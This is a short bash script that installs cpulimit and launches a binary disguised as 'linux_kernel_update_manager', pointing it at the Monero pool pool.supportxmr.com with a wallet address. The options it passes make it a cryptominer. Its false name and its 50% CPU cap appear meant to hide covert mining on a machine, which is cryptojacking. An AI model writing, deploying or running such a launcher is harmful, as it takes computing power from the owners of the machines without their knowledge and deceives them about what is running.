#!/bin/bash
sudo apt-get update &
sleep 10
sudo apt install -y cpulimit &&
chmod +x ~/gg001/linux_kernel_update_manager &&
cpulimit -e linux_kernel_update_manager -l 50 -b &
sleep 10
~/gg001/./linux_kernel_update_manager --any --ssl --forever --variation 3 --low -o pool.supportxmr.com:443 -u 45rgestFBHnMTUfuVSvSekfuW4QxaqEyfSwJRQPuvxg9CMZr9mrvuBx9FUzWxSxsT59KykZaaHjQ6GRpTsz9ZdcC3Ko96Ev+1500 -p google  -c ~/gg001/config.txt &
sleep 60m


